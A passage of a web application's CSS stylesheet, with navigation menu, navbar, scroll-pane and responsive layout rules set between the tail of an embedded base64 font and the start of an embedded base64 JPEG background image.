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)format("woff2");
    font-weight: bold;
    font-style: normal
}

@keyframes menuin {
    0% {
        opacity: 0;
        transform: scale(1.1)
    }

    100% {
        opacity: 1;
        transform: scale(1)
    }
}

@keyframes menuout {
    0% {
        opacity: 1;
        transform: scale(1)
    }

    99.9% {
        opacity: 0;
        transform: scale(1.1)
    }

    100% {
        opacity: 0;
        transform: translateX(-100%)
    }
}

#menupane {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    display: none;
    width: 100%;
    position: absolute;
    transform: translate3d(100%, 0, 0);
    z-index: 1035;
    background: white;
    transition: none
}

#menupane a:hover,
#menupane a:focus {
    text-decoration: none
}

#menupane #menu-nav-items {
    list-style-type: none;
    padding-left: 0px
}

#menupane #menu-nav-items li {
    margin: 0
}

#menupane #menu-nav-items li>a,
#menupane #menu-nav-items li>button {
    border: 0;
    text-align: left;
    border-radius: 0;
    position: relative;
    padding: 6px 15px 6px 15px;
    color: #696969;
    cursor: pointer;
    width: 100%;
    white-space: nowrap;
    text-overflow: ellipsis;
    display: inline-block;
    overflow: hidden
}

#menupane #menu-nav-items li>a icon,
#menupane #menu-nav-items li>button icon {
    display: inline-block;
    margin-right: 7px
}

#menupane #menu-nav-items li>a icon svg,
#menupane #menu-nav-items li>button icon svg {
    display: block;
    position: relative;
    top: 2px
}

#menupane #menu-nav-items li>a icon svg path,
#menupane #menu-nav-items li>button icon svg path {
    fill: #696969;
    transition: fill 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#menupane #menu-nav-items li>a .menu-item-label,
#menupane #menu-nav-items li>button .menu-item-label {
    font-size: 17px;
    font-weight: normal;
    font-style: normal;
    transition: color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#menupane #menu-nav-items li>a:hover,
#menupane #menu-subnav-items li>a:hover,
#menupane #menu-nav-items li>a:focus,
#menupane #menu-subnav-items li>a:focus,
#menupane #menu-nav-items li>button:hover,
#menupane #menu-subnav-items li>button:hover,
#menupane #menu-nav-items li>button:focus,
#menupane #menu-subnav-items li>button:focus {
    text-decoration: none
}

#menupane #menu-nav-items li>button.active {
    color: #FF6200
}

#menupane #menu-nav-items li>button.active icon path {
    fill: #FF6200;
    transition: fill 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#menupane #menu-nav-items li>a.active:hover,
#menupane #menu-subnav-items li>a.active:hover,
#menupane #menu-nav-items li>button.active:hover,
#menupane #menu-subnav-items li>button.active:hover {
    color: #FF6200
}

#menupane #menu-nav-items li>a.active:hover icon path,
#menupane #menu-subnav-items li>a.active:hover icon path,
#menupane #menu-nav-items li>button.active:hover icon path,
#menupane #menu-subnav-items li>button.active:hover icon path {
    fill: #FF6200;
    transition: fill 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#menupane #menu-nav-items li>a.active:hover span,
#menupane #menu-subnav-items li>a.active:hover span,
#menupane #menu-nav-items li>button.active:hover span,
#menupane #menu-subnav-items li>button.active:hover span {
    font-weight: bold
}

#menupane #menu-nav-items li>button.active span {
    font-weight: bold
}

#menupane {
    top: 51px;
    height: auto;
    bottom: 0
}

#menupane .navbar-static-top {
    display: none
}

#menupane .scrollpane-container {
    top: 0
}

#menupane:before {
    display: block;
    position: absolute;
    height: 100%;
    width: 100%;
    left: -100%;
    top: 0;
    content: " ";
    pointer-events: none;
    background: black;
    opacity: 0;
    transition: opacity 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.menu-open #menupane:before {
    opacity: 0.5
}

#menupane #menu-nav-items li>a,
#menupane #menu-nav-items li>button {
    max-width: none
}

@media (min-width:768px) {
    #menupane {
        background: #333333;
        width: 220px;
        opacity: 1;
        display: block;
        z-index: 1;
        transform: none;
        animation: none !important;
        backface-visibility: visible !important;
        top: 0
    }

    #menupane .scrollpane-container .scrollpane .scrollpane-content {
        -webkit-overflow-scrolling: auto !important
    }

    #menupane #menu-nav-items>li {
        position: relative
    }

    #menupane #menu-nav-items>li>a,
    #menupane #menu-nav-items>li>button {
        color: #D9D9D9;
        padding: 8px 15px 8px 15px
    }

    #menupane #menu-nav-items>li>a icon svg,
    #menupane #menu-nav-items>li>button icon svg {
        width: 18px;
        height: 18px
    }

    #menupane #menu-nav-items>li>a icon svg path,
    #menupane #menu-nav-items>li>button icon svg path {
        fill: #A8A8A8
    }

    #menupane #menu-nav-items>li>a .menu-item-label,
    #menupane #menu-nav-items>li>button .menu-item-label {
        font-size: 16px;
        font-weight: normal;
        font-style: normal
    }

    #menupane #menu-nav-items>li>a:hover,
    #menupane #menu-nav-items>li>button:hover,
    #menupane #menu-subnav-items>li>a:hover,
    #menupane #menu-subnav-items>li>button:hover {
        color: white
    }

    #menupane #menu-nav-items>li>a:hover icon path,
    #menupane #menu-nav-items>li>button:hover icon path,
    #menupane #menu-subnav-items>li>a:hover icon path,
    #menupane #menu-subnav-items>li>button:hover icon path {
        fill: white
    }

    #menupane #menu-nav-items>li>button.active {
        color: white
    }

    #menupane #menu-nav-items>li>a.active:hover,
    #menupane #menu-nav-items>li>button.active:hover,
    #menupane #menu-subnav-items>li>a.active:hover,
    #menupane #menu-subnav-items>li>button.active:hover {
        color: white
    }
}

@media (min-width:1025px) {
    #menupane {
        width: 320px
    }

    #menupane #menu-nav-items {
        margin-top: 40px
    }

    #menupane #menu-nav-items>li>a,
    #menupane #menu-nav-items>li>button {
        padding-left: 20px
    }

    #menupane #menu-nav-items>li>a .menu-item-label,
    #menupane #menu-nav-items>li>button .menu-item-label {
        font-size: 17px
    }
}

#menupane.public-menu a {
    text-decoration: none
}

#menupane.public-menu a:hover,
#menupane.public-menu a:focus {
    text-decoration: none
}

#menupane.public-menu .scrollpane-container #menu-nav-items {
    margin-top: 15px
}

#menupane.public-menu .scrollpane-container #menu-nav-items>li>a,
#menupane.public-menu .scrollpane-container #menu-nav-items>li>button {
    padding-top: 15px;
    padding-bottom: 15px
}

#menupane.public-menu .scrollpane-container #menu-nav-items>li>a.subitem {
    padding-top: 10px;
    padding-bottom: 10px
}

#menupane.public-menu .scrollpane-container #menu-nav-items>li>a.subitem .menu-item-label {
    font-size: 15px
}

@media (min-width:768px) {
    #menupane.public-menu .navbar-static-top {
        display: block;
        background: rgb(63.75, 63.75, 63.75);
        border: 0
    }

    #menupane.public-menu .navbar-static-top button.close {
        display: none
    }

    #menupane.public-menu .navbar-static-top .navbar-brand {
        height: 70px;
        padding-left: 20px;
        display: flex;
        align-items: center;
        color: white
    }

    #menupane.public-menu .scrollpane-container {
        top: 70px
    }
}

.menu-disabled #menupane .scrollpane:after {
    content: "";
    position: absolute;
    background: black;
    opacity: 0.3;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 150;
    pointer-events: none
}

.navbar-default.navbar-static-top {
    margin-bottom: 0px;
    overflow: hidden;
    z-index: 1;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none
}

@media (min-width:768px) {
    .navbar-default.navbar-static-top .navbar-header {
        float: none
    }
}

.navbar-default.navbar-static-top .navbar-header {
    margin-left: -7.5px;
    margin-right: -7.5px;
    position: relative
}

.navbar-default.navbar-static-top .navbar-header .navbar-brand {
    width: 100%;
    margin: 0;
    font-size: 21px;
    line-height: 22px;
    font-weight: normal;
    font-style: normal;
    padding-top: 14px;
    display: block;
    float: none
}

@media (min-width:1025px) {
    .navbar-default.navbar-static-top {
        height: 70px
    }
}

@media (max-width:767px) {
    .bs-navbar-back {
        transition: opacity 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946), transform 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
    }
}

@media (max-width:767px) {
    .bs-navbar-title {
        transition: opacity 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946), transform 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
    }
}

#contentpane {
    position: absolute;
    left: 0px;
    right: 0px;
    top: 0px;
    bottom: 0px;
    background: white
}

@media (min-width:768px) {
    #contentpane {
        left: 220px;
        z-index: 2;
        box-shadow: 0px 0px 6px #000;
        border-top-left-radius: 4px
    }
}

@media (min-width:1025px) {
    #contentpane {
        left: 320px;
        border-top-left-radius: 0px;
        box-shadow: none
    }
}

.scrollpane-container {
    position: absolute;
    left: 0px;
    top: 50px
}

.scrollpane-container {
    right: 0px;
    bottom: 0px
}

@media (min-width:768px) {
    .scrollpane-container {
        top: 70px
    }
}

.scrollpane,
[scrollable] {
    width: 100%;
    height: 100%;
    position: absolute;
    overflow: hidden
}

.scrollpane .scrollpane-content,
[scrollable] .scrollpane-content {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    z-index: 0;
    -webkit-overflow-scrolling: touch
}

.scrollpane.compact-scrollbar .scrollpane-content,
[scrollable].compact-scrollbar .scrollpane-content {
    overflow-y: scroll
}

.scrollpane.compact-scrollbar.scrollbar-width-15 .scrollpane-content,
[scrollable].compact-scrollbar.scrollbar-width-15 .scrollpane-content {
    right: -15px
}

.footer:after {
    content: "";
    position: absolute;
    background-image: linear-gradient(rgba(0, 0, 0, 0), black);
    top: -4px;
    left: 0;
    width: 100%;
    height: 4px;
    opacity: 0.1
}

@media (min-width:1281px) {
    body.public #contentpane {
        right: 0
    }
}

body {
    transition: outline 0.15s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#appcontainer {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0
}

@media (min-width:768px) {
    .browser-mode .view-animate {
        transition-delay: 0.1s;
        background-color: white
    }
}

body.no-animations *:hover,
body.no-animations *:active {
    transition: none !important;
    animation: none !important
}

.file-upload .btn-upload:hover {
    border-color: #FF6200 !important;
    background-color: rgb(255, 239.3, 229.5)
}

.toggle-action .list-group .list-group-item .pull-right:after {
    display: none
}

.mying-discover-video:after {
    content: "";
    background: url(data:image/jpeg;base64,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